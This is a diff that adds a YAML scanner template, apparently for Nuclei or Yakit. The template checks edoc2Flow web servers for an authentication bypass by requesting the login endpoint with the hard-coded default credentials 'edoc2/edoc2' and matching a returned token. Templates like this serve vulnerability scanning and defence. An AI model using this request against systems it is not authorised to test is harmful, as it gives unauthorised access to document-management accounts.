@@ -1,0 +1,37 @@
+id: edoc2-auth-pass
+info:
+  name: edoc2-auth-pass
+  author: admin
+  severity: high
+  description: edoc2-auth-pass
+  metadata:
+    max-request: 1
+    shodan-query: ""
+    verified: true
+  yakit-info:
+    sign: 1b57bfe64589458bbf045de6b62cf275
+
+http:
+- method: GET
+  path:
+  - '{{RootURL}}/edoc2Flow-web/login/index?appId=edoc2&password=edoc2'
+  headers:
+    Accept-Encoding: gzip, deflate, br
+    Accept-Language: zh-CN,zh;q=0.9
+    Connection: keep-alive
+    Upgrade-Insecure-Requests: "1"
+    User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like
+      Gecko) Chrome/39.0.2171.71 Safari/537.36
+
+  max-redirects: 3
+  disable-cookie: true
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - token
+    condition: and
+
+
+# Generated From WebFuzzer on 2026-01-07 17:38:32
